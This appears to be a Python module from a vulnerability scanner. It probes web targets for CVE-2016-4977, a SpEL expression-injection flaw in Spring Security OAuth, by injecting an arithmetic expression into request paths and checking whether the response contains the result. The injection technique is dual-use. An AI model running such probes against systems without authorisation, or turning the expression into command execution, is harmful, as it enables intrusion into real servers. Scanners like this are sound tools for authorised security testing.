#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests

def cve_2016_4977_scan(self, url):
    ''' Spring Security OAuth是为Spring框架提供安全认证支持的一个模块;
        在其使用whitelabel views来处理错误时, 由于使用了Springs Expression Language (SpEL), 
            攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2016-4977'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    random_num_1, random_num_2 = random_int_2()

    for payload in self.cve_2016_4977_payloads:
        path = payload['path'].format('${' + str(random_num_1) + '*' + str(random_num_2) + '}')
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (str(random_num_1 * random_num_2) in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
